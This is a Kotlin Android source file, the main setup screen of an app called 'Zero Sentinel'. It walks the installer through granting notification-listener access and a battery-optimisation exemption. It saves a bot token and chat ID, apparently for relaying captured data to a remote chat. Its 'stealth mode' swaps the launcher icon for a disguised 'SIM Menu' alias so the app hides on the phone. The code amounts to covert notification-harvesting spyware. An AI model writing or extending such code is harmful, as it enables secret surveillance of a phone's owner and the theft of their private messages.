package com.zero.sentinel.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.zero.sentinel.R
import com.zero.sentinel.services.SentinelAccessibilityService

import android.content.ComponentName
import android.content.pm.PackageManager
import android.net.Uri
import android.os.PowerManager
import android.view.View

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var enableButton: Button
    private lateinit var batteryButton: Button
    private lateinit var stealthButton: Button
    private lateinit var botTokenInput: EditText
    private lateinit var chatIdInput: EditText
    private lateinit var saveButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.tv_status)
        enableButton = findViewById(R.id.btn_enable_accessibility)
        enableButton.text = "1. Enable Notification Access"
        
        batteryButton = findViewById(R.id.btn_ignore_battery)
        stealthButton = findViewById(R.id.btn_enable_stealth)
        botTokenInput = findViewById(R.id.et_bot_token)
        chatIdInput = findViewById(R.id.et_chat_id)
        saveButton = findViewById(R.id.btn_save_connection)

        val prefsManager = com.zero.sentinel.data.EncryptedPrefsManager(this)

        // Load existing
        botTokenInput.setText(prefsManager.getBotToken())
        chatIdInput.setText(prefsManager.getChatId())

        // Save Connection
        saveButton.setOnClickListener {
            val token = botTokenInput.text.toString()
            val chat = chatIdInput.text.toString()
            
            if (token.isNotEmpty() && chat.isNotEmpty()) {
                prefsManager.saveBotToken(token)
                prefsManager.saveChatId(chat)
                Toast.makeText(this, "Credentials Saved!", Toast.LENGTH_SHORT).show()
                // Restart Service to pick up new creds
                startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
            } else {
                Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
            }
        }

        // 1. Notification Access
        enableButton.setOnClickListener {
            if (!isNotificationServiceEnabled()) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
                
                Toast.makeText(this, "Find 'Zero Sentinel' and enable it.", Toast.LENGTH_LONG).show()
            }
        }

        // 2. Battery Optimization
        batteryButton.setOnClickListener {
            requestBatteryOptimization()
        }

        // 3. Stealth Mode
        stealthButton.setOnClickListener {
            enableStealthMode()
        }
        
        // Start Foreground Service immediately if possible
        startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun updateStatus() {
        // Check Notification Access
        if (isNotificationServiceEnabled()) {
            enableButton.isEnabled = false
            enableButton.text = "Access Granted ✅"
        } else {
            enableButton.isEnabled = true
        }

        // Check Battery
        if (isIgnoringBatteryOptimizations()) {
            batteryButton.isEnabled = false
            batteryButton.text = "Battery Ignored ✅"
        } else {
            batteryButton.isEnabled = true
        }

        statusText.text = "Setup Status: ${if (enableButton.isEnabled) "Incomplete" else "Ready"}"
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val packageName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        if (!isIgnoringBatteryOptimizations()) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun enableStealthMode() {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        val aliasName = ComponentName(this, "com.zero.sentinel.ui.StealthAlias")

        // Enable Alias (SIM Menu)
        pm.setComponentEnabledSetting(
            aliasName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

        // Disable Main Activity (Zero Sentinel)
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        Toast.makeText(this, "Stealth Mode Activated. App will close.", Toast.LENGTH_LONG).show()
        finish()
    }
}
